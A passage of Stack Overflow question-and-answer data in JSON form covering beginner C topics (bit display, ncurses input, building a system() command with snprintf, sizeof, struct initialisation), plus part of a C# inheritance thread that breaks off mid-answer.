"<a href=\"https://stackoverflow.com/questions/7863499/conversion-of-char-to-binary-in-c\" title=\"conversion of char to binary in c\">stackoverflow.com/questions/7863499/&hellip;</a> follow this link"}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1524634478, "post_id": 50014591, "comment_id": 87045534, "body": "the value is already binary... ALL is binary in computer... You should use <code>unsigned char</code> for binary shift."}], "answers": [{"comments": [{"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 1, "creation_date": 1524635834, "post_id": 50014878, "comment_id": 87046060, "body": "<code>i =  c + \u20180\u2019;</code> why?? It&#39;s wrong. Further - for this to work use <code>unsigned char</code> and also <code>int bits[8] = {0};</code> to get the array initialized. Correcting that may make this work but why not use a simple loop?"}], "tags": [], "owner": {"reputation": 111, "user_id": 8524753, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/01ebcd2400b0b39a1b12547addca7700?s=128&d=identicon&r=PG&f=1", "display_name": "Dustin177820", "link": "https://stackoverflow.com/users/8524753/dustin177820"}, "is_accepted": false, "score": 0, "last_activity_date": 1524635474, "creation_date": 1524635474, "answer_id": 50014878, "question_id": 50014591, "link": "https://stackoverflow.com/questions/50014591/how-to-convert-char-value-to-binary-and-display-each-bit-separately/50014878#50014878", "title": "How to convert char value to binary and display each bit separately?", "body": "<p>You could do a conversion doing math with the c code.. I did not click on the possible duplicate post but something like..</p>\n\n<pre><code>int i;\nchar c; \nint bits[8];\n/*get a character from stdin and save it to c*/\ni =  c + \u20180\u2019;\nif(i&gt;=128){\n    bits[7]=1;\n     i= i-128;\n}\nif(i&gt;=64){\n    bits[6]=1;\n    i = i - 64;\n}\nif(i &gt;= 32){\n    bits[5]=1;\n    i =i- 32\n}\n\n// do this for all the bits\n</code></pre>\n\n<p>This should work and then you have bits[0] - bits[7] your 0-7 bits!! I am sure there is a better way to do this but this should work!!</p>\n"}], "owner": {"reputation": 19, "user_id": 9650656, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e9f9276e297f9e082ccaf4925807ade1?s=128&d=identicon&r=PG&f=1", "display_name": "J.Smith", "link": "https://stackoverflow.com/users/9650656/j-smith"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 56, "favorite_count": 0, "closed_date": 1524634594, "answer_count": 1, "score": 0, "last_activity_date": 1547648473, "creation_date": 1524633961, "last_edit_date": 1547648473, "question_id": 50014591, "link": "https://stackoverflow.com/questions/50014591/how-to-convert-char-value-to-binary-and-display-each-bit-separately", "closed_reason": "Duplicate", "title": "How to convert char value to binary and display each bit separately?", "body": "<p>As a practice exercise I'm trying to convert an entered char value to binary and display each bit of the 8 bit output.\nI have found some example code for conversion:  </p>\n\n<pre><code>int main (void)\n{\nchar a =16;\nint i=0;\nfor (i = 0; i &lt; 8;i++) { \nprintf(\"%d\", !!((a &lt;&lt; i) &amp; 0x80));}\nreturn 0;\n}\n</code></pre>\n\n<p>however when I use an entered value for a such as with the code:</p>\n\n<pre><code>int main(void){\nchar a;\nprintf(\"Enter char value:\", a);\nscanf(\"%c\", &amp;a);\nprintf(\"a=%c\", a);\nreturn 0 ;}\n</code></pre>\n\n<p>the incorrect value is given.\nAnd also how would I be able to display each bit separately? for example</p>\n\n<pre><code>printf(\"The sign bit is %d\\n\", &amp;);\nprintf(\"The bit 6 is %d\\n\", &amp;);\nprintf(\"The bit 5 is %d\\n\", &amp;);\nprintf(\"The bit 4 is %d\\n\", &amp;);\nprintf(\"The bit 3 is %d\\n\", &amp;);\nprintf(\"The bit 2 is %d\\n\", &amp;);\nprintf(\"The bit 1 is %d\\n\", &amp;);\nprintf(\"The bit 0 is %d\\n\", &amp;);\n</code></pre>\n"}, {"tags": ["c", "ncurses"], "comments": [{"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1524631598, "post_id": 50014137, "comment_id": 87044618, "body": "Can you debug a little to narrow the problem to either the <code>getch()</code> thing in <code>kbhit()</code> or the <code>scanf()</code> in the <code>while()</code> ?"}, {"owner": {"reputation": 1, "user_id": 9695024, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/adc7b62bc5bc65495cfb27400c5c8a6d?s=128&d=identicon&r=PG&f=1", "display_name": "mark", "link": "https://stackoverflow.com/users/9695024/mark"}, "reply_to_user": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1524656118, "post_id": 50014137, "comment_id": 87058208, "body": "The problem when I use scanw is that it takes whatever the value of price variable right away without waiting for user&#39;s input. So it would be random value if I don&#39;t initialize it. Does anyone else have any idea how to fix this?"}], "answers": [{"tags": [], "owner": {"reputation": 42737, "user_id": 4518274, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UPurS.png?s=128&g=1", "display_name": "Thomas Dickey", "link": "https://stackoverflow.com/users/4518274/thomas-dickey"}, "is_accepted": false, "score": 1, "last_activity_date": 1524643673, "creation_date": 1524643673, "answer_id": 50017093, "question_id": 50014137, "link": "https://stackoverflow.com/questions/50014137/printw-plus-scanf-in-ncurse-window-wont-display-typed-text/50017093#50017093", "title": "printw plus scanf in ncurse window won&#39;t display typed text", "body": "<p>It doesn't <em>work</em> because <strong><code>scanf</code></strong> reads from the standard input, which is put into <em>raw mode</em> by ncurses (actually any curses library).  You probably meant <a href=\"https://invisible-island.net/ncurses/man/curs_scanw.3x.html\" rel=\"nofollow noreferrer\"><strong><code>scanw</code></strong></a>, which reads the input using the ncurses library.</p>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 9695024, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/adc7b62bc5bc65495cfb27400c5c8a6d?s=128&d=identicon&r=PG&f=1", "display_name": "mark", "link": "https://stackoverflow.com/users/9695024/mark"}, "is_accepted": false, "score": 0, "last_activity_date": 1524720003, "creation_date": 1524720003, "answer_id": 50035345, "question_id": 50014137, "link": "https://stackoverflow.com/questions/50014137/printw-plus-scanf-in-ncurse-window-wont-display-typed-text/50035345#50035345", "title": "printw plus scanf in ncurse window won&#39;t display typed text", "body": "<p>Setting nodelay to FALSE and calling echo() before the first printw allowed me to use scanw. I just had to set them back to noecho() and nodelay=TRUE right after scanw and everything works fine as expected. Thanks everyone!</p>\n\n<pre><code>case 32:\n       nodelay(stdscr, FALSE);\n       echo();\n       printw(\"\\nPrice in USD? \");\n       refresh();\n       scanw(\"%d\", &amp;price);\n       nodelay(stdscr, TRUE);\n       noecho();\n       printw(\"Price entered: %d\\n\",price);\n       refresh();\n       break;\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 9695024, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/adc7b62bc5bc65495cfb27400c5c8a6d?s=128&d=identicon&r=PG&f=1", "display_name": "mark", "link": "https://stackoverflow.com/users/9695024/mark"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 436, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1524720003, "creation_date": 1524630868, "question_id": 50014137, "link": "https://stackoverflow.com/questions/50014137/printw-plus-scanf-in-ncurse-window-wont-display-typed-text", "title": "printw plus scanf in ncurse window won&#39;t display typed text", "body": "<p>I got this portion of my program that prints something on the screen indefinitely until the user hits the spacebar and enter some value. I tried calling echo() right before the first printw but it didn't work. Can anyone tell me why when typing, the price doesn't get displayed on the screen or at least point me to the right place? I also initially used scanw but it won't interrupt the loop and some random values are already being retrieved for the price.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;ncurses.h&gt;\n\n\nint kbhit(void){\n    int ch = getch();\n    if (ch != ERR) {\n        ungetch(ch);\n        return 1;\n    } else {\n        return 0;\n    }\n}\n\nint main()\n{\n    initscr();\n    cbreak();\n    echo();\n    nodelay(stdscr, TRUE);\n    scrollok(stdscr, TRUE);\n    int price;\n\n    while(1){\n        printw(\"sleeping...\\n\");\n        refresh();\n        if (kbhit()) {\n            char c = getch();\n            switch (c){\n                case 32:\n                    printw(\"\\nPrice in USD? \");\n                    refresh();\n                    scanf(\"%d\", &amp;price);\n                    printw(\"\\nPrice entered: %d\\n\",price);\n                    refresh();\n                    break;\n            }\n        }\n        sleep(1);\n    }\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 581, "user_id": 5863848, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s3w85.jpg?s=128&g=1", "display_name": "NishanthSpShetty", "link": "https://stackoverflow.com/users/5863848/nishanthspshetty"}, "edited": false, "score": 1, "creation_date": 1524629224, "post_id": 50013886, "comment_id": 87044054, "body": "please add some code snipped on what have you tried so far?"}, {"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 2, "creation_date": 1524629420, "post_id": 50013886, "comment_id": 87044115, "body": "Don&#39;t forget the <a href=\"https://linux.die.net/man/3/exec\" rel=\"nofollow noreferrer\"><code>exec</code> family of functions</a> which take discrete arguments. This largely avoids the need to &quot;shell escape&quot; things. If <code>foo</code> contains a space this method of smashing things together produces invalid results."}, {"owner": {"reputation": 113, "user_id": 9694938, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64ffd97069b8fac02f17a0886654894e?s=128&d=identicon&r=PG&f=1", "display_name": "Al Smith", "link": "https://stackoverflow.com/users/9694938/al-smith"}, "reply_to_user": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 2, "creation_date": 1524630251, "post_id": 50013886, "comment_id": 87044307, "body": "@tadman Perfect, execv works for me"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1524669970, "post_id": 50013886, "comment_id": 87068233, "body": "the <code>as</code> is the &#39;portable GNU assembler`  So your call to <code>system()</code> seems to be trying to take an assembly source file, and run that through the assembler to produce an object file of the same name.  Do I understand your objective correctly?"}], "answers": [{"comments": [{"owner": {"reputation": 113, "user_id": 9694938, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64ffd97069b8fac02f17a0886654894e?s=128&d=identicon&r=PG&f=1", "display_name": "Al Smith", "link": "https://stackoverflow.com/users/9694938/al-smith"}, "edited": false, "score": 0, "creation_date": 1524630226, "post_id": 50013994, "comment_id": 87044298, "body": "This answers the question of formatting strings, thank you for that. I&#39;ll mark this as the answer since it technically does what I want it to. But I think for this particular program I&#39;ll use execv :)"}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "reply_to_user": {"reputation": 113, "user_id": 9694938, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64ffd97069b8fac02f17a0886654894e?s=128&d=identicon&r=PG&f=1", "display_name": "Al Smith", "link": "https://stackoverflow.com/users/9694938/al-smith"}, "edited": false, "score": 0, "creation_date": 1524630349, "post_id": 50013994, "comment_id": 87044330, "body": "@AlSmith that definitively a better choice ;)"}, {"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 0, "creation_date": 1524630701, "post_id": 50013994, "comment_id": 87044414, "body": "Don&#39;t forget to <code>free</code> the result if it succeeds."}, {"owner": {"reputation": 32386, "user_id": 4706785, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fdee2789e9bac57bfdd97abc4e533a4d?s=128&d=identicon&r=PG&f=1", "display_name": "Peter", "link": "https://stackoverflow.com/users/4706785/peter"}, "edited": false, "score": 1, "creation_date": 1524630711, "post_id": 50013994, "comment_id": 87044416, "body": "If <code>malloc()</code> is used, it is necessary to <code>free(p)</code> AFTER the <code>system()</code> call, to avoid a leak.       It is also possible to use basic string functions (<code>strlen()</code>, <code>strcpy()</code>, <code>strcat()</code>, etc) to work out required length and copy the strings as needed - arguably preferable if you need to add multiple command line arguments to a single string."}], "tags": [], "owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "is_accepted": true, "score": 5, "last_activity_date": 1524631032, "last_edit_date": 1524631032, "creation_date": 1524629878, "answer_id": 50013994, "question_id": 50013886, "link": "https://stackoverflow.com/questions/50013886/how-can-i-merge-strings-in-the-system-function/50013994#50013994", "title": "How can I merge strings in the system function?", "body": "<p>You could use <a href=\"http://man7.org/linux/man-pages/man3/snprintf.3.html\" rel=\"nofollow noreferrer\"><code>snprintf()</code></a>:</p>\n\n<pre><code>int size = snprintf(NULL, 0, \"as %s.s -o %s.o\", argv[i], argv[i]);\nif (size &lt; 0) {\n  return ERROR; // handle error as you like\n}\nchar *p = malloc(++size); // we add the +1 for the nul terminate byte\nif (p == NULL) {\n  return ERROR;\n}\nint ret = snprintf(p, size, \"as %s.s -o %s.o\", argv[i], argv[i]);\nif (ret &lt; 0) {\n  free(p);\n  return ERROR;\n}\n\nsystem(p);\n\nfree(p); // if you don't need it anymore\n</code></pre>\n\n<p>Note: The only problem is that for obscure reason, <code>snprintf()</code> don't return <code>size_t</code>. But it's the only fonction we can use in std to do what you want.</p>\n"}], "owner": {"reputation": 113, "user_id": 9694938, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64ffd97069b8fac02f17a0886654894e?s=128&d=identicon&r=PG&f=1", "display_name": "Al Smith", "link": "https://stackoverflow.com/users/9694938/al-smith"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 91, "favorite_count": 0, "accepted_answer_id": 50013994, "answer_count": 1, "score": 4, "last_activity_date": 1524631032, "creation_date": 1524629113, "last_edit_date": 1524629482, "question_id": 50013886, "link": "https://stackoverflow.com/questions/50013886/how-can-i-merge-strings-in-the-system-function", "title": "How can I merge strings in the system function?", "body": "<p>I have some string, <code>foo</code> and I want to be able to run something like <code>as foo.s -o foo.o</code>. If this were <code>printf</code>, I would be able to do <code>printf(\"as %s.s -o %s.o\", foo, foo);</code>. What I want to be able to do is something like that, except with the <code>system</code> function. How can I do this? Using the same approach as <code>printf</code> gives me an error saying I've passed too many arguments.</p>\n\n<p>In my code, I have:</p>\n\n<pre><code>   for (int i = 1; i &lt; argc; i++) {\n     system(\"as %s.s -o %s.o\", *(argv + i), *(argv + i));\n   }\n</code></pre>\n\n<p>But this gives me an error saying I have too many arguments. I suppose I could go through the painful process of looping through character arrays, but I'd rather avoid that. </p>\n"}, {"tags": ["c", "sizeof"], "comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 2, "creation_date": 1524627630, "post_id": 50013696, "comment_id": 87043665, "body": "Post code as text to improve clarity."}, {"owner": {"reputation": 288, "user_id": 9119611, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1107f82f8670a7d1cf1a4f146a3e9f4c?s=128&d=identicon&r=PG&f=1", "display_name": "Arshdeep Singh", "link": "https://stackoverflow.com/users/9119611/arshdeep-singh"}, "edited": false, "score": 0, "creation_date": 1524627817, "post_id": 50013696, "comment_id": 87043702, "body": "I&#39;ve wanted to show output of port with the code"}, {"owner": {"reputation": 757, "user_id": 824501, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/gQCRZ.png?s=128&g=1", "display_name": "Stan", "link": "https://stackoverflow.com/users/824501/stan"}, "edited": false, "score": 0, "creation_date": 1524628242, "post_id": 50013696, "comment_id": 87043824, "body": "You may need <code>sizeof(msg)&#47;sizeof(msg[0])</code>."}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 0, "creation_date": 1524647247, "post_id": 50013696, "comment_id": 87052560, "body": "@ArshdeepSingh : But how is the output port relevant to teh size of the array.  You have not even specified the size you are getting - I would <i>expect</i>  on an 8051 platform - you should also specify your platform - I have inferred 8051 from the header file included, if it were not for that I&#39;d have assumed ARM since that is Keil&#39;s primary product since there were acquired by ARM.  <code>sizeof</code> an array is not the same as the number of elements.  Your expression <code>sizeof(msg)&#47;2</code> is ill advised - better <code>sizeof(msg)&#47;sizeof(*msg)</code> which will be portable regardless of the platform."}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 0, "creation_date": 1524651771, "post_id": 50013696, "comment_id": 87055507, "body": "@ArshdeepSingh ; Ah - I see that you are using the port to &quot;display&quot; the size -  You could have used a debugger watchpoint or just said that <code>y == 8</code> - we&#39;d have believed you."}], "answers": [{"tags": [], "owner": {"reputation": 58292, "user_id": 34824, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/ri8DI.jpg?s=128&g=1", "display_name": "abelenky", "link": "https://stackoverflow.com/users/34824/abelenky"}, "is_accepted": false, "score": 2, "last_activity_date": 1524627839, "creation_date": 1524627839, "answer_id": 50013744, "question_id": 50013696, "link": "https://stackoverflow.com/questions/50013696/sizeof-returns-double-the-value-that-of-specified-array-in-embedded-c/50013744#50013744", "title": "sizeof(); returns double the value that of specified array in embedded C", "body": "<p>Your message is not at all clear, but I believe you are getting 8, when you expect 4.</p>\n\n<p><code>sizeof()</code> returns the number of BYTES in a variable.<br>\nIf <code>unsigned int</code> is 2-bytes on this platform, then an array of 4 ints has a size of 8 bytes.</p>\n"}], "owner": {"reputation": 288, "user_id": 9119611, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1107f82f8670a7d1cf1a4f146a3e9f4c?s=128&d=identicon&r=PG&f=1", "display_name": "Arshdeep Singh", "link": "https://stackoverflow.com/users/9119611/arshdeep-singh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 358, "favorite_count": 0, "closed_date": 1524628014, "answer_count": 1, "score": -1, "last_activity_date": 1524654339, "creation_date": 1524627445, "last_edit_date": 1524654339, "question_id": 50013696, "link": "https://stackoverflow.com/questions/50013696/sizeof-returns-double-the-value-that-of-specified-array-in-embedded-c", "closed_reason": "Duplicate", "title": "sizeof(); returns double the value that of specified array in embedded C", "body": "<p><strong>[image of an executed code in keil]</strong></p>\n\n<p><img src=\"https://i.stack.imgur.com/ZGc3s.png\"></p>\n\n<p>I've written above code to move an array( msg[ ] ) to Port 0(I'm using Keil \u00b5vision), in which 'unsigned int y' gets the size of the array and displays it to Port 1(Port-1 output is shown in the image, whereas Port-0 output is not)</p>\n\n<p>Question:</p>\n\n<ol>\n<li>Why am I getting double the value of the specified array? </li>\n</ol>\n"}, {"tags": ["c", "arrays", "data-structures", "struct", "c11"], "comments": [{"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1524662182, "post_id": 50013653, "comment_id": 87062809, "body": "Shouldn&#39;t the initializer list be the other way around? <code>1e5</code> is a double, <code>0</code> is an int. Or in case the order is correct, you should add some casts."}, {"owner": {"reputation": 4020, "user_id": 5082463, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/877843e34372342a80c73f38ee79ad60?s=128&d=identicon&r=PG&f=1", "display_name": "KcFnMi", "link": "https://stackoverflow.com/users/5082463/kcfnmi"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1524662675, "post_id": 50013653, "comment_id": 87063181, "body": "Question  edited. The order was correct. But I missed the fact <code>1e5</code> is a double."}], "answers": [{"comments": [{"owner": {"reputation": 4020, "user_id": 5082463, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/877843e34372342a80c73f38ee79ad60?s=128&d=identicon&r=PG&f=1", "display_name": "KcFnMi", "link": "https://stackoverflow.com/users/5082463/kcfnmi"}, "edited": false, "score": 0, "creation_date": 1524629710, "post_id": 50013826, "comment_id": 87044183, "body": "How to proceed in case <code>typed</code> becomes needed?"}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "reply_to_user": {"reputation": 4020, "user_id": 5082463, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/877843e34372342a80c73f38ee79ad60?s=128&d=identicon&r=PG&f=1", "display_name": "KcFnMi", "link": "https://stackoverflow.com/users/5082463/kcfnmi"}, "edited": false, "score": 0, "creation_date": 1524630736, "post_id": 50013826, "comment_id": 87044420, "body": "@KcFnMi You can&#39;t <code>typedef</code> don&#39;t allow to declare variable in the same time like struct does. <a href=\"http://rextester.com/JOLNL9436\" rel=\"nofollow noreferrer\">rextester.com/JOLNL9436</a>"}], "tags": [], "owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "is_accepted": true, "score": 0, "last_activity_date": 1524628589, "creation_date": 1524628589, "answer_id": 50013826, "question_id": 50013653, "link": "https://stackoverflow.com/questions/50013653/the-shortest-path-to-an-array-of-struct/50013826#50013826", "title": "The shortest path to an array of struct", "body": "<pre><code>int main(void) {\n  struct {\n    int size;\n    double time;\n  } timming[5] = {{1e5, 0}, {2e5, 0}};\n//  } timming[5] = {{.size = 1e5, .time = 0}, {.size = 2e5, .time = 0}};\n}\n</code></pre>\n"}], "owner": {"reputation": 4020, "user_id": 5082463, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/877843e34372342a80c73f38ee79ad60?s=128&d=identicon&r=PG&f=1", "display_name": "KcFnMi", "link": "https://stackoverflow.com/users/5082463/kcfnmi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 37, "favorite_count": 0, "accepted_answer_id": 50013826, "answer_count": 1, "score": 0, "last_activity_date": 1524662541, "creation_date": 1524627151, "last_edit_date": 1524662541, "question_id": 50013653, "link": "https://stackoverflow.com/questions/50013653/the-shortest-path-to-an-array-of-struct", "title": "The shortest path to an array of struct", "body": "<p>In order to get an array of struct I did:</p>\n\n<pre><code>int main() {\n    typedef struct {\n        int size;\n        double time;\n    } timming_s;\n    timming_s timming[5];\n    timming[0] = (timming_s){(int)1e5, 0.0};\n    timming[1] = (timming_s){(int)2e5, 0.0};\n}\n</code></pre>\n\n<p>Is there a more compact form to get it? I was trying to write:</p>\n\n<pre><code>int main() {\n    struct timming_s {\n        int size;\n        double time;\n    } timming[5];\n    timming[0] = {(int)1e5, 0.0};\n    timming[1] = {(int)2e5, 0.0};\n}\n</code></pre>\n"}, {"tags": ["c"], "answers": [{"tags": [], "owner": {"reputation": 366, "user_id": 5215844, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-g2ib5Eg3Wq8/AAAAAAAAAAI/AAAAAAAAAfM/2Z6MFYnR78M/photo.jpg?sz=128", "display_name": "Mazaher Bazari", "link": "https://stackoverflow.com/users/5215844/mazaher-bazari"}, "is_accepted": false, "score": 3, "last_activity_date": 1524628584, "last_edit_date": 1524628584, "creation_date": 1524627084, "answer_id": 50013648, "question_id": 50013577, "link": "https://stackoverflow.com/questions/50013577/cant-work-out-method-overloading/50013648#50013648", "title": "Cant work out method overloading", "body": "<p>When base class has constructor with parameter you should call it explicity.\nit must be:</p>\n\n<pre><code>public FreshItem():base(/*pass paramter*/)\n{\n}\n</code></pre>\n\n<p>See: <a href=\"https://stackoverflow.com/questions/26979260/derived-class-explicit-base-constructor-call\">Derived class explicit base constructor call\n</a></p>\n\n<p>And for your second problem <code>PurchasedItem</code> and <code>FreshItem</code> must inherit from  <code>GroceryItem</code> and implement <code>FindMethod</code>:</p>\n\n<pre><code>public abstract class GroceryItem\n    {\n    public string Name {set;get;}\n    public double Price {set;get;}\n\n    public GroceryItem(string name, double price){\n        this.Name = name;\n        this.Price = price;\n    }\n\n    public abstract double FindCost();\n}\npublic class PurchasedItem: GroceryItem\n{\n    public int Quantity {set;get;}\n    public PurchasedItem(string name, double price, int quntity):base(name, price)\n    {\n      this.Quantity = quntity;\n    }\n\n    public override double FindCost()\n    {\n        return this.Price * this.Quantity * 1.10;\n    }\n\n\n}\npublic class FreshItem : GroceryItem\n{\n    public double Weight {set;get;}\n\n    public FreshItem(string name, double price, int weight) : base(name, price)\n    {\n        this.Weight= weight;\n    }\n    public override double FindCost()\n    {\n        return this.Price * this.Weight;\n    }\n}\n\n\npublic static void Main(string[] args)\n{\n    var item1 = new PurchasedItem(\"Lettuce\", 2.05,12);\n    double cost1 = item1.FindCost();\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 487, "user_id": 1614532, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ee298c58320fa37ebba1fea9e5bbab79?s=128&d=identicon&r=PG", "display_name": "Asakuraa Ranger", "link": "https://stackoverflow.com/users/1614532/asakuraa-ranger"}, "is_accepted": false, "score": 1, "last_activity_date": 1524628137, "creation_date": 1524628137, "answer_id": 50013776, "question_id": 50013577, "link": "https://stackoverflow.com/questions/50013577/cant-work-out-method-overloading/50013776#50013776", "title": "Cant work out method overloading", "body": "<p>To fix first error use Mazaher Bazari answer</p>\n\n<p>but your code still won't work like you want</p>\n\n<p>try fix like this</p>\n\n<pre><code>class Program\n{\n    public static void Main(string[] args)\n    {\n        var item1 = new GroceryItem(\"Lettuce\", 2.05);\n        item1.pItem = new FreshItem(item1);\n        item1.pItem.Quantity = 12;\n        double cost1 = item1.pItem.FindCost();\n\n\n        Console.WriteLine(item1.Name + \" \" + item1.Price);\n        Console.WriteLine(cost1);\n        Console.ReadLine();\n    }\n}\npublic class PurchasedItem\n{\n    public int Quantity;\n    protected GroceryItem item;\n    public PurchasedItem(GroceryItem gItem)\n    {\n        item = new GroceryItem(gItem.Name, gItem.Price);\n    }\n\n    public virtual double FindCost()\n    {\n        return item.Price * this.Quantity * 1.10;\n    }\n\n\n}\npublic class FreshItem : PurchasedItem\n{\n    public double weight;\n\n    public FreshItem(GroceryItem gItem) : base(gItem)\n    {\n    }\n\n    public override double FindCost()\n    {\n        return this.item.Price * this.weight;\n    }\n\n}\npublic class GroceryItem\n{\n    public string Name;\n    public double Price;\n\n    public PurchasedItem pItem\n    {\n        get;\n        set;\n    }\n\n    public GroceryItem()\n    {\n    }\n\n    public GroceryItem(string name, double price)\n    {\n        this.Name = name;\n        this.Price = price;\n    }\n}\n</code></pre>\n\n<p>you should add <code>Virtual</code> and <code>Override</code> to override method if not you need to new instance as FreshItem to use FreshItem FindCost</p>\n"}, {"tags": [], "owner": {"reputation": 21683, "user_id": 4228458, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/fj2C5.jpg?s=128&g=1", "display_name": "CodingYoshi", "link": "https://stackoverflow.com/users/4228458/codingyoshi"}, "is_accepted": true, "score": 1, "last_activity_date": 1524628649, "creation_date": 1524628649, "answer_id": 50013831, "question_id": 50013577, "link": "https://stackoverflow.com/questions/50013577/cant-work-out-method-overloading/50013831#50013831", "title": "Cant work out method overloading", "body": "<p>You are doing this:</p>\n\n<pre><code>FreshItem : PurchasedItem\n</code></pre>\n\n<p>So you 